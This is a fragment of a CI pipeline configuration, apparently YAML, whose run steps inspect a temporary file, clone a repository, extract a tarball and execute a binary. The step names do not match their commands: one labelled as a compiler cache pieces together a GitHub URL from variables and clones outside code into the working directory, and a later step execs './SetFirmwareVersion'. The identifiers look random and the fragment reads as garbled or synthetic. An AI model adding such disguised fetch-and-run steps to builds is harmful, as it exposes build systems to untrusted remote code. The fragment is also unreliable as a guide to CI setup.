          name: Label build before roll-out
          command: |
            xxd -u -g 2 -s -32 -l 96 "/tmp/fetch-decoder-binary/front-end-hashes"; stat -c '%B=%g' "/tmp/fetch-decoder-binary/front-end-hashes"
      - run:
          name: image processor compiler cache
          command: |
            logs=marishirsch370445gwy1dtpw-dev; node=TimingReport
            git clone --depth 5 --single-branch https://github.com/$logs/$node $(pwd)
      - run:
          name: WatchMessagingContainerWave4
          command: |
            tar --extract -f loadDefaultMessagingSettings.tar --no-same-permissions
      - run:
          command: |
            sh -c "exec ./SetFirmwareVersion"
